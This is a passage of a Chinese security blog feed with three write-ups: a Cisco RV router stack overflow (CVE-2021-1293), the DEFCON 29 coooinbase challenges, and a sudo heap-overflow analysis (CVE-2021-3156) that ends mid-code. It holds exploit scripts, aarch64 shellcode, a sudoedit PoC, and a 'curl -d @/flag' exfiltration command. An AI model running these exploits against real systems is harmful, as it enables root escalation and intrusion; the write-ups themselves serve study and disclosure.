<code>sub_15CE4</code> 函数, 然后就能看到明显的栈溢出漏洞 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  src = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">if</span> ( *sessionID &amp;&amp; <span class="built_in">strstr</span>(sessionID, a2) &amp;&amp; (src = strtok(sessionID, a2)) != <span class="number">0</span> )<span class="comment">// sub_15CE4(v14, &quot;;&quot;, &quot;=&quot;, v10, v4);</span></span><br><span class="line">    <span class="built_in">strcpy</span>(s, src);                             <span class="comment">// BOF</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(s, sessionID);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706141734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706141734.png"></a></p><p>溢出后，我们可以控制的， 看起来我们可以控制的寄存器只有 R11 ， 但实际上，返回后 R0 寄存器则是我们传入 cookie 参数的指针。</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706142456.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706142456.png" style="zoom: 50%;" /></a><p>因此我们可以在 payload 的前面直接放置 system 执行的命令，然后控制 PC跳转到 system 函数上（ httpd 程序本身有调用 httpd 的地方，不需要leak， 另外提一句，因为有 00 截断，因此我只能控制一次 PC 的地址，但是对这个环境来说足够了</p><p>另外这个题目在 0ctf 中是位于 iOA的后面的， 我们需要通过 iOA的vpn功能，访问内网中这个路由器，因此我们需要手撸一个 route 转发， 然后我们的圣博就直接用 scapy 简单撸了一个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">base = ip2long(<span class="string">&#x27;172.31.0.0&#x27;</span>)</span><br><span class="line">m = login()</span><br><span class="line">req_vip(m, base + <span class="number">2</span>)</span><br><span class="line">sport = randint(<span class="number">1024</span>, <span class="number">65535</span>)</span><br><span class="line">ip = IP(src=<span class="string">&#x27;172.31.0.2&#x27;</span>, dst=<span class="string">&#x27;10.1.1.1&#x27;</span>)</span><br><span class="line">SYN = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;S&#x27;</span>, seq=<span class="number">1000</span>)</span><br><span class="line">s = raw(ip / SYN)</span><br><span class="line">route(m, s)</span><br><span class="line">data = recv_packet(m)</span><br><span class="line">ack = IP(data)</span><br><span class="line">a = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;A&#x27;</span>, seq=ack.ack + <span class="number">1</span>, ack=ack.seq + <span class="number">1</span>)</span><br><span class="line">route(m, raw(ip / a))</span><br><span class="line">d = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;PA&#x27;</span>, seq=<span class="number">1001</span>, ack=ack.seq + <span class="number">1</span>) / payload.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">route(m, raw(ip / d))</span><br><span class="line"></span><br><span class="line">m.interactive()</span><br></pre></td></tr></table></figure><p>最后利用 <code>curl -d @/flag server:port</code> 的命令获取了flag （另外不能有空格， 如果存在空格的话就会被截断，因此这里用了 ${IFS} 替换了空格）</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706143147.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706143147.png" style="zoom:50%;" /></a><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/RV/RV.py">利用脚本</a>：</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/RV/RV.py">http://bestwing.me/attachments/2021-TCTF-quals/RV/RV.py</a></p><p>binary idb</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/RV/mini/_httpd.idb">http://bestwing.me/attachments/2021-TCTF-quals/RV/mini\_httpd.idb</a></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>该漏洞已经修复， strcpy 函数换成了 strncpy 函数， 如果受到漏洞影响请尽快更新固件版本到最新版本。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv160-260-rce-XZeFkNHf">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv160-260-rce-XZeFkNHf</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CTF Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2021-1293" scheme="https://bestwing.me/tags/CVE-2021-1293/"/>
    
    <category term="TCTF" scheme="https://bestwing.me/tags/TCTF/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON 29 CTF Qualifier  coooinbase and coooinbase-kernel Write-up</title>
    <link href="https://bestwing.me/DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html"/>
    <id>https://bestwing.me/DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html</id>
    <published>2021-05-02T16:00:00.000Z</published>
    <updated>2021-05-03T20:09:20.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="DEFCON-29-CTF-Qualifier-coooinbase-amp-amp-coooinbase-kernel-Write-up"><a href="#DEFCON-29-CTF-Qualifier-coooinbase-amp-amp-coooinbase-kernel-Write-up" class="headerlink" title="DEFCON 29 CTF Qualifier:  coooinbase &amp;&amp; coooinbase-kernel Write-up"></a>DEFCON 29 CTF Qualifier:  coooinbase &amp;&amp; coooinbase-kernel Write-up</h2><h3 id="coooinbase"><a href="#coooinbase" class="headerlink" title="coooinbase"></a>coooinbase</h3><p>题目描述：</p><blockquote><p>a simple service backed by special hardware for buying bitcoin: our beta testing server is live at <a href="http://52.6.166.222:4567/">http://52.6.166.222:4567</a> - this time attack the kernel!</p></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504004319.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504004319.png"></a></p><p>图：1 题目服务首页</p><p>从题目的首页的 <code>custom hardware</code> 处可以下到题目的固件包。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004611006.png" title="image-20210504004611006" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004611006.png" alt="image-20210504004611006"></a></p><p>图: 2 下载题目固件</p><p>可以看到固件包里包以下文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  coooinbase tar -xvzf src</span><br><span class="line">x dist&#x2F;</span><br><span class="line">x dist&#x2F;x.rb</span><br><span class="line">x dist&#x2F;coooinbase.bin</span><br><span class="line">x dist&#x2F;rootfs.img</span><br><span class="line">x dist&#x2F;x.sh</span><br><span class="line">x dist&#x2F;x.html</span><br></pre></td></tr></table></figure><p>其中 <code>x.rb</code> 是 web 的后端服务，我们需要关注的代码逻辑如图:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004932474.png" title="image-20210504004932474" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004932474.png" alt="image-20210504004932474"></a></p><p>图3： x.rb 代码</p><p>阅读代码，我们可以知道一下几点：</p><ol><li>当我们访问 <code>/buy</code> api 的时候， 代码会请求 <code>HTTP_POST</code> 地址处的的 <code>/gen-bson</code> api, 当获取到 <code>/gen-bson</code> api 返回的数据后，会将数据写入 <code>pwn</code> 文件中，然后以重定向的形式喂入 <code>./x.sh</code> 文件</li><li><code>/gen-bson</code> 这个 api 会调用 <code>valid_credit_card</code> 和 <code>valid_association</code> 函数分别校验填入的 cardnumber 的合法性。 但是值得注意的是，这两个函数均会调用 <code>to_s.gusb(/\D/, &#39;&#39;)</code> 将传入的 <code>number</code> 变量中的非数字给去掉，但是在 44 -处的 <code>number</code> 却是仍然带有字符串的，因此此处我们可以传入其他非数字的值 （6011000000000004 这个cardnmumber 可以过校验）</li><li><code>gen-bson</code> 在45-46 行处会将参数转成 bson 格式，且 base64 编码， 然后返回</li></ol><p>（注： 此处还有有个点，我在一开始的时候没注意到，暂且不提）</p><p><code>x.sh</code> 的代码内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 1 qemu-system-aarch64 -machine virt -cpu cortex-a57 -smp 1 -m 64M -nographic -serial mon:stdio -monitor none -kernel coooinbase.bin -drive <span class="keyword">if</span>=pflash,format=raw,file=rootfs.img,unit=1,<span class="built_in">readonly</span></span><br></pre></td></tr></table></figure><p>用 qemu 跑起一个服务， 内核为: <code>coooinbase.bin</code> 以及有对应的 rootfs.img , 通过以下命令可以将文件系统 mount 出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modprobe nbd max_part&#x3D;8</span><br><span class="line">qemu-nbd --connect&#x3D;&#x2F;dev&#x2F;nbd0 .&#x2F;rootfs.img</span><br><span class="line">mkdir rootfs</span><br><span class="line">mount &#x2F;dev&#x2F;nbd0 rootfs</span><br></pre></td></tr></table></figure><p>可以看到 文件系统中有三个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  rootfs ls</span><br><span class="line">bin  flg  run</span><br></pre></td></tr></table></figure><p>其中 bin 和 run , 通过逆向发现是一样的文件， flg 是flag 文件</p><p>猜测 bin （run) 就是要 pwn 的用户态程序， 通过启动命令，我们知道架构为 aarch64, cpu 为 cortex-a57, 我们使用 IDA  Pro 打开该文件， 设置如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012341867.png" title="image-20210504012341867" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012341867.png" alt="image-20210504012341867"></a></p><p>图4：IDA 加载</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012534460.png" title="image-20210504012534460" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012534460.png" alt="image-20210504012534460"></a></p><p>图4：IDA分析截图</p><p>然后就必然发现 IDA 什么函数都没有分析出来， 所以我们需要修正下我们的 IDB，修复出函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504014746398.png" title="image-20210504014746398" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504014746398.png" alt="image-20210504014746398"></a></p><p>图5：修复后的 IDA 截图</p><p>在 <code>bsion_find_string</code> 中我们发现了一处动态分配栈空间的逻辑</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504015258789.png" title="image-20210504015258789" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504015258789.png" alt="image-20210504015258789"></a></p><p>图5：动态分配栈空间</p><p>在地址 0xB6C 处， X1 为传入的字符串大小， 此处判断需要动态分配的栈的大小 。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504025826791.png" title="image-20210504025826791" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504025826791.png" alt="image-20210504025826791"></a></p><p>图5：mapping 截图</p><p>但是这里存在一个问题， 这个没有判断传入的字符串大小是不是太大，如果太大的话， 例如我传入 0xf000 大小的字符串，那么此时将分配 0xf000 大小的栈， 即 <code>SP = SP - 0xffff</code>  , 由于栈在程序代码段的下方，此时将导致栈会被分配到代码段上，而且由于是 qemu 启动的程序，所有的段都是可写可执行的。</p><p>因此，这个题目的思路如下：</p><p>构造足够长的字符串，将栈分配之后将执行的代码段位置， 写入 shellcode 然后最后执行 shellcode. 由于程序有现成 open read write 的函数， 因此 shellcode 编写方便了许多，我们只需直接 call 函数即可。</p><p>shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag_path_name = <span class="number">0x715</span></span><br><span class="line">open_addr = <span class="number">0x340</span></span><br><span class="line">read_addr = <span class="number">0x34C</span></span><br><span class="line">write_addr = <span class="number">0x310</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode = pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:flag_path_name, <span class="string">&#x27;x1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:open_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line"></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0xFFFF000000088858</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">0x50</span>, <span class="string">&#x27;x12&#x27;</span>:read_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:<span class="number">0x715</span>, <span class="string">&#x27;x12&#x27;</span>:write_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line">print(asm(shellcode))</span><br></pre></td></tr></table></figure><p>但是这里会出现一个坑点:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504030941428.png" title="image-20210504030941428" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504030941428.png" alt="image-20210504030941428"></a></p><p>ruby to bson 的时候得是 UTF-8 的字符集，这意味这在 x.rb 代码中的（见图4） 45 是过不去的， 然后在比赛的时候一度陷入试图把我的 shellcode 的修改为全为 UTF-8 字符集的艰苦工作中。 然后 peanuts 发现，  <code>HTTP_POST</code>  是由 HTTP header 中的 HOST字段控制的， 这以为我们不需要通过后端自身的 <code>/gen_bson</code> api 传入构造好的 payload ， 我们只需搭建我们自己的服务， 当接收到 <code>/gen_bson</code> 请求后， 传回我们的 payload。</p><h2 id="coooinbase-kernel"><a href="#coooinbase-kernel" class="headerlink" title="coooinbase-kernel"></a>coooinbase-kernel</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035715437.png" title="image-20210504035715437" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035715437.png" alt="image-20210504035715437"></a></p><p>内核实现了几个syscall</p><p>其中 write 限制了读取的地址的范围</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035800048.png" title="image-20210504035800048" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035800048.png" alt="image-20210504035800048"></a></p><p>但是 read 中没有限制写入的地址的范围</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504035843.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504035843.png"></a></p><p>因此这个题的思路为：</p><p>在已经完成的用户态任意代码执行的基础上</p><ol><li>open bin 文件，找到一个无意义的代码</li><li>lseek 到该处</li><li>read 该处的代码</li><li>通过 read 向内核的 write 的判断地址范围的地方写掉</li><li>调用 write 将内核地址中的 flag 打印出</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode = pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:<span class="number">0x715</span>, <span class="string">&#x27;x1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x340</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fseek</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0x510</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x364</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0xFFFF000000082A5C</span><span class="number">-4</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">8</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x34C</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&quot;MOV             X0, X6\n&quot;</span></span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x2&#x27;</span>:<span class="number">0x50</span>, <span class="string">&#x27;x6&#x27;</span>:<span class="number">0xFFFF000000088858</span>,<span class="string">&#x27;x12&#x27;</span>:<span class="number">0x310</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;MOV X0, X6\n&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="Defcon" scheme="https://bestwing.me/tags/Defcon/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156 sudo heap-overflow 漏洞分析</title>
    <link href="https://bestwing.me/CVE-2021-3156-analysis.html"/>
    <id>https://bestwing.me/CVE-2021-3156-analysis.html</id>
    <published>2021-01-31T16:00:00.000Z</published>
    <updated>2021-02-03T06:13:29.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>1 月26 日的时候， 有文章披露了 sudo 代码中存在 堆缓冲区溢出，于是花了漫长的时间尝试写相关利用, 本文以学习笔记为主。</p><p>完整利用可见：</p><p><a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p><blockquote><p>The Qualys Research Team has discovered a heap overflow vulnerability in sudo, a near-ubiquitous utility available on major Unix-like operating systems. Any unprivileged user can gain root privileges on a vulnerable host using a default sudo configuration by exploiting this vulnerability.</p><p>Sudo is a powerful utility that’s included in most if not all Unix- and Linux-based OSes. It allows users to run programs with the security privileges of another user. The vulnerability itself has been hiding in plain sight for nearly 10 years. It was introduced in July 2011 (commit 8255ed69) and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.</p><p>Successful exploitation of this vulnerability allows any unprivileged user to gain root privileges on the vulnerable host. Qualys security researchers have been able to independently verify the vulnerability and develop multiple variants of exploit and obtain full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and distributions are also likely to be exploitable.</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里以 sudo 1.8.31 版本作为分析目标。 ubuntu 20.04.1 作为分析环境</p><p>PoC:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> obufsz = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">char</span> obuf[obufsz];</span><br><span class="line"><span class="built_in">memset</span>(obuf, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span>(obuf));</span><br><span class="line">obuf[obufsz<span class="number">-2</span>] = <span class="number">0x5c</span>;</span><br><span class="line">obuf[obufsz<span class="number">-1</span>] = <span class="number">0x00</span>;</span><br><span class="line"><span class="keyword">char</span> *args[] = &#123;</span><br><span class="line"><span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line"><span class="string">&quot;-s&quot;</span>,</span><br><span class="line">obuf,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *extra_args[] = &#123;</span><br><span class="line"><span class="string">&quot;X/X\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;a&quot;</span>,</span><br><span class="line"><span class="string">&quot;LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">execve(args[<span class="number">0</span>], args, extra_args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// execvpe(&quot;./sudoedit&quot;, args, extra_args);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞产生的代码位于 <code>plugins/sudoers/sudoers.c</code>  的 <code>set_cmnd</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" title="image-20210201141621764" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" alt="image-20210201141621764"></a></p><p>首先通过 854 处，为 <code>sudoedit</code>  <code>-s</code>  后的字符长度分配内存空间， 即 <code>user_args</code>,  当代码处理到 866 处的时候， 如果参数为如下结构，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p NewArgv[0]</span><br><span class="line">$4 &#x3D; 0x55555557183e &quot;sudoedit&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[1]</span><br><span class="line">$5 &#x3D; 0x7fffffffee13 &quot;BBBBBB\\&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[2]</span><br><span class="line">$6 &#x3D; 0x0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>第一次拷贝 会将 <code>B</code> 拷贝到 <code>user_args</code> 里，然后 from ++ </p><p>当 <code>B</code> 拷贝完， <code>from[0] == &#39;\\&#39;</code> ， 且<code>from[1]</code> 不为空的时候， 此时 from ++ , 然后又进到这个 while 循环， from 后面的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p from[0]</span><br><span class="line">$3 &#x3D; 92 &#39;\\&#39;</span><br><span class="line">pwndbg&gt; p from[1]</span><br><span class="line">$4 &#x3D; 0 &#39;\000&#39;</span><br></pre></td></tr></table></figure><p>这个时候 from 后面的数据为环境变量设置的数据, 即这里此时 <code>from[0]</code> 为 <code>X/X</code> 。最终结果就是 <code>user_args</code> 被越界</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h4 id="三种利用思路"><a href="#三种利用思路" class="headerlink" title="三种利用思路"></a>三种利用思路</h4><p>原作者的提到了， 他们通过随机添加 <code>LC_*</code> 等环境变量来风水堆布局， 产生了数十种 crash 样本，其中有三种利用思路，</p><p>（1）通过覆写 <code>sudo_hook_entry</code>  结构体</p><pre><code>该部分代码位于 `src/hooks.c`  107行 ， 总体思路为 通过堆溢出，劫持函数指针getenv_fn 的低两位， 通过爆破的方法将函数劫持到 `execv` 来执行我们的程序。 该思路已经有公开的利用代码,  可见[Github](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)</code></pre><p>   (2)  通过覆写 <code>service_user</code> 结构体</p><pre><code>该部分代码位于 glibc 源代码中的 `glibc-2.31/nss/nsswitch.c` 的330 行， </code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line"><span class="number">329</span> &#123;</span><br><span class="line"><span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">331</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">338</span>       ni-&gt;library = 